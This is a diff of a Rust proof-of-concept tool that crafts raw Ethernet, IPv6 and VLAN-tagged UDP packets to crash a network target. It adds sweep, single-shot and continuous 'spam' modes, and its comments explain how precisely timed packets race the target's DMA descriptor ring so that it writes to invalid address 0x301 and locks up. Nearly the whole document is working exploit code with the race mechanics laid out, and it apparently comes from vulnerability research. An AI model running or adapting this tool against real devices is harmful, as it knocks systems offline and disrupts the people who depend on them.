@@ -1,8 +1,8 @@
 use anyhow::{anyhow, bail, Context, Result};
-use clap::Parser;
-use log::{info, warn};
+use clap::{Parser, Subcommand};
+use log::{info, trace, warn};
 use pnet::{
-    datalink::DataLinkReceiver,
+    datalink::{DataLinkReceiver, DataLinkSender},
     ipnetwork::IpNetwork,
     packet::{
         ethernet::{
@@ -39,8 +39,33 @@ struct Args {
     #[arg(long)]
     mac: String,
 
-    #[arg(short, long, default_value_t = 0)]
-    pad: usize,
+    #[clap(subcommand)]
+    cmd: Command,
+}
+
+#[derive(Debug, Subcommand)]
+enum Command {
+    /// Sweeps packet delay across a range
+    Sweep {
+        /// Time offset at which to begin the sweep, in microseconds
+        #[arg(long, allow_hyphen_values(true), default_value_t = -2000)]
+        start: i64,
+        /// Time offset at which to end the sweep, in microseconds
+        #[arg(long, allow_hyphen_values(true), default_value_t = 2000)]
+        end: i64,
+    },
+    /// Send a single packet with a specific delay
+    One {
+        /// Time offset, in microseconds
+        #[arg(long, allow_hyphen_values(true))]
+        delay: i64,
+    },
+    /// Send a constant stream of packets with a specific delay
+    Spam {
+        /// Time offset, in microseconds
+        #[arg(long, allow_hyphen_values(true))]
+        delay: i64,
+    },
 }
 
 fn main() -> Result<()> {
@@ -79,11 +104,10 @@ fn main() -> Result<()> {
         read_timeout: Some(Duration::from_millis(100)),
         ..Default::default()
     };
-    let (mut sender, mut receiver) =
-        match pnet::datalink::channel(&interface, cfg)? {
-            pnet::datalink::Channel::Ethernet(tx, rx) => (tx, rx),
-            _ => bail!("Unknown channel type"),
-        };
+    let (sender, receiver) = match pnet::datalink::channel(&interface, cfg)? {
+        pnet::datalink::Channel::Ethernet(tx, rx) => (tx, rx),
+        _ => bail!("Unknown channel type"),
+    };
 
     let builder = Builder {
         source_ip,
@@ -92,97 +116,233 @@ fn main() -> Result<()> {
         dest_mac,
     };
 
+    let mut worker = Worker {
+        builder,
+        sender,
+        receiver,
+    };
+
     // Send a friendly packet to ensure that we're in the target's NDP tables
     info!("sending initial packet to populate NDP tables");
-    let (udp, payload_len, tag) = builder.udp(&[0]);
-    let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
-    let hello_packet = builder.eth(ipv6, ethertype);
-    sender.send_to(hello_packet.packet(), None);
-    let (reply, _rx_time) =
-        receive_udp(receiver.as_mut(), Duration::from_millis(500)).ok_or_else(
-            || {
-                anyhow!(
-                    "could not send initial packet; \
-                     is the target already locked up?"
-                )
-            },
-        )?;
-    assert_eq!(reply, vec![0]);
+    if !worker.check_alive() {
+        bail!("could not send initial packet; is the target already locked up?")
+    }
     info!("received reply from hello packet");
 
-    let (udp, payload_len, tag) = builder.udp(&[b'1']);
-    let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
-    let delay_packet = builder.eth(ipv6, ethertype);
-
-    // Build our attack packets with a VLAN VID payload, triggering an invalid
-    // DMA write address.
-    let mut packets = vec![];
-    for i in 1..6 {
-        let mut data: Vec<u8> = format!("data-{i}").as_bytes().to_vec();
-        for _p in 0..46 {
-            // found experimentally
-            data.push(b'0');
+    match args.cmd {
+        Command::Sweep { start, end } => {
+            if end <= start {
+                bail!("end must be greater than start");
+            }
+            let delay = worker.run_delay_sweep(start, end)?;
+            println!("{delay}");
         }
-        let (udp, payload_len, tag) = builder.udp(&data);
-        let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
-        let (vlan, ethertype) = builder.vlan(0x301, ipv6, ethertype);
-        let eth = builder.eth(vlan, ethertype);
-        packets.push(eth);
-    }
-
-    // Send our attack sequence
-    info!("sending attack sequence");
-    let send_start = Instant::now();
-    sender.send_to(delay_packet.packet(), None);
-    let send_end = Instant::now();
-    std::thread::sleep(Duration::from_millis(50));
-
-    for p in packets {
-        sender.send_to(p.packet(), None);
-    }
-    let (reply, rx_time) =
-        receive_udp(receiver.as_mut(), Duration::from_millis(500))
-            .ok_or_else(|| anyhow!("timeout waiting for rx"))?;
-    info!("received reply from delay packet: {reply:?}");
-
-    info!("time since send called:   {:?}", rx_time - send_end);
-    info!("time since send returned: {:?}", rx_time - send_start);
-
-    sender.send_to(hello_packet.packet(), None);
-    if receive_udp(receiver.as_mut(), Duration::from_millis(500)).is_none() {
-        info!("target killed successfully");
-    } else {
-        warn!("target is still replying");
+        Command::One { delay } => {
+            worker.run_one(delay)?;
+        }
+        Command::Spam { delay } => loop {
+            worker.run_one(delay)?;
+        },
     }
 
     Ok(())
 }
 
-/// Receives a single UDP packet
-///
-/// Returns the packet data and arrival time on success, or `None` on timeout
-fn receive_udp(
-    receiver: &mut dyn DataLinkReceiver,
-    timeout: Duration,
-) -> Option<(Vec<u8>, Instant)> {
-    let start = Instant::now();
-    while Instant::now() - start < timeout {
-        let Ok(rx) = receiver.next() else {
-            continue;
-        };
-        let rx_time = Instant::now();
-        let packet = EthernetPacket::new(rx).unwrap();
-        if EtherTypes::Ipv6 == packet.get_ethertype() {
-            let header = Ipv6Packet::new(packet.payload()).unwrap();
-            if IpNextHeaderProtocols::Udp == header.get_next_header() {
-                let udp = UdpPacket::new(header.payload()).unwrap();
-                if udp.get_destination() == SOURCE_PORT {
-                    return Some((udp.payload().to_owned(), rx_time));
+struct Worker {
+    builder: Builder,
+    sender: Box<dyn DataLinkSender>,
+    receiver: Box<dyn DataLinkReceiver>,
+}
+
+impl Worker {
+    fn udp_packet(&self, data: &[u8]) -> impl Packet {
+        let (udp, payload_len, tag) = self.builder.udp(data);
+        let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);
+        self.builder.eth(ipv6, ethertype)
+    }
+
+    fn hello_packet(&self) -> impl Packet {
+        self.udp_packet(&[0])
+    }
+
+    fn delay_packet(&self) -> impl Packet {
+        self.udp_packet(&[b'1'])
+    }
+
+    /// Checks whether the target is still alive
+    ///
+    /// Returns `true` if it replies, `false` otherwise
+    fn check_alive(&mut self) -> bool {
+        self.sender.send_to(self.hello_packet().packet(), None);
+        self.receive_udp(Duration::from_millis(100)).is_some()
+    }
+
+    fn run_delay_sweep(&mut self, start: i64, end: i64) -> Result<i64> {
+        for n in 0.. {
+            info!("beginning iteration {n}");
+            for i in start..end {
+                if let Err(e) = self.run_one(i) {
+                    warn!("ignoring error {e}");
+                    break;
+                }
+                if !self.check_alive() {
+                    info!("killed with delay {i}");
+                    return Ok(i);
                 }
             }
         }
+        unreachable!()
     }
-    None
+
+    /// Tries to kill the target with a particular timing delay
+    fn run_one(&mut self, delay_micros: i64) -> Result<()> {
+        // Build our attack packets with a VLAN VID payload, triggering an invalid
+        // DMA write address if we successfully attack the descriptor.
+        let mut padding_packets = vec![];
+        for i in 0..4 {
+            // Build a padded packet which is long enough to be discarded by the
+            // target, to keep things simple.
+            let mut data: Vec<u8> = format!("data-{i}-").as_bytes().to_vec();
+            for i in 0..16 {
+                data.push(b'1' + i % 10);
+            }
+            let (udp, payload_len, tag) = self.builder.udp(&data);
+            let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);
+            let (vlan, ethertype) = self.builder.vlan(0x301, ipv6, ethertype);
+            let eth = self.builder.eth(vlan, ethertype);
+            padding_packets.push(eth);
+        }
+
+        // Send our attack sequence
+        trace!("sending attack sequence with delay {delay_micros}");
+        let send_start = Instant::now();
+
+        // This triggers a 250 ms busywait
+        self.sender.send_to(self.delay_packet().packet(), None);
+
+        // Brief pause to make sure that the busy-wait happened
+        std::thread::sleep(Duration::from_millis(10));
+
+        // Send three padding packets.  At this point, the descriptor ring should
+        // look like the following:
+        //
+        // -0------1------2------------
+        // | user | user | user | dma |
+        // ----------------------------
+        // ^ user position      ^ dma position (in "waiting for packet" state)
+        for p in &padding_packets {
+            self.sender.send_to(p.packet(), None);
+        }
+
+        // Sleep until the busy-wait ends
+        let mut sleep_amount =
+            Duration::from_millis(20) - (Instant::now() - send_start);
+        if delay_micros > 0 {
+            sleep_amount += Duration::from_micros(delay_micros as u64);
+        } else {
+            sleep_amount -= Duration::from_micros(-delay_micros as u64);
+        }
+        std::thread::sleep(sleep_amount);
+
+        // Remember, at this point, our descriptor ring looks like the
+        // following:
+        //
+        // -0------1------2------3-----
+        // | user | user | user | user |
+        // ----------------------------
+        // ^ user position
+        // ^ dma position (in "suspended" state)
+        //
+        // When user code exits the busy-wait, it will begin processing packet 0
+        // and then poke the tail pointer to restart the peripheral.
+        //
+        // -0------1------2------3-----
+        // | dma  | user | user | user |
+        // ----------------------------
+        //        ^ user position
+        // ^ dma position (in "waiting for packet" state)
+        //
+        // We want the DMA peripheral to finish storing the incoming packet into
+        // slot 0 at the exact same time as the user code releases descriptor 1
+        // in the ring.  This means that we have a window where the DMA
+        // peripheral can read descriptor 0 in the ring at the same time as user
+        // code writes it, triggering our bug.
+        //
+        // If the packet arrives too early, it will get written to descriptor 0
+        // and when processing the second user packet, we'll notice that the DMA
+        // peripheral is off:
+        //
+        //  -0------1------2------3------
+        //  | user | user | user | user |  DMA writes new packet to slot 0
+        //  -----------------------------
+        //         ^ user position
+        //         ^ dma position (off)
+        //
+        //  -0------1------2------3------
+        //  | user | dma  | user | user |  User code processes slot 0
+        //  -----------------------------
+        //         ^ user position
+        //         ^ dma position (waiting for packet)
+        //
+        // This will be indicated by a Suspended value in the DMA peripheral
+        //
+        // If the packet arrives way too late, when processing the first user
+        // packet, DMA will still be waiting:
+        //
+        //  -0------1------2------3------
+        //  | user | dma  | user | user |  user code processes packet in slot 1
+        //  -----------------------------
+        //                ^ user position
+        //  ^ dma position ("waiting for packet")
+        //
+        //  -0------1------2------3------
+        //  | user | dma  | user | user | DMA writes new packet to slot 0
+        //  -----------------------------
+        //                ^ user position
+        //         ^ dma position ("waiting for packet")
+        //
+        // This means that we can tell our critical timing by examining when we
+        // start seeing "suspended" readings in our 6-packet burst.
+        self.sender.send_to(padding_packets[0].packet(), None);
+
+        // If we successfully poisoned the descriptor, then the DMA peripheral is
+        // waiting to write to address 0x301, which is invalid.  Any further
+        // communication will fail.
+
+        // Receive the initial reply
+        if let Some((reply, _reply_time)) =
+            self.receive_udp(Duration::from_millis(10))
+        {
+            assert_eq!(reply, vec![b'1']);
+        } else {
+            bail!("failed to receive initial reply");
+        }
+        Ok(())
+    }
+
+    /// Receives a single UDP packet
+    ///
+    /// Returns the packet data and arrival time on success, or `None` on timeout
+    fn receive_udp(&mut self, timeout: Duration) -> Option<(Vec<u8>, Instant)> {
+        let start = Instant::now();
+        while Instant::now() - start < timeout {
+            let Ok(rx) = self.receiver.next() else {
+            continue;
+        };
+            let rx_time = Instant::now();
+            let packet = EthernetPacket::new(rx).unwrap();
+            if EtherTypes::Ipv6 == packet.get_ethertype() {
+                let header = Ipv6Packet::new(packet.payload()).unwrap();
+                if IpNextHeaderProtocols::Udp == header.get_next_header() {
+                    let udp = UdpPacket::new(header.payload()).unwrap();
+                    if udp.get_destination() == SOURCE_PORT {
+                        return Some((udp.payload().to_owned(), rx_time));
+                    }
+                }
+            }
+        }
+        None
+    }
 }
 
 /// Convert a MAC address to a link-local IPv6 address
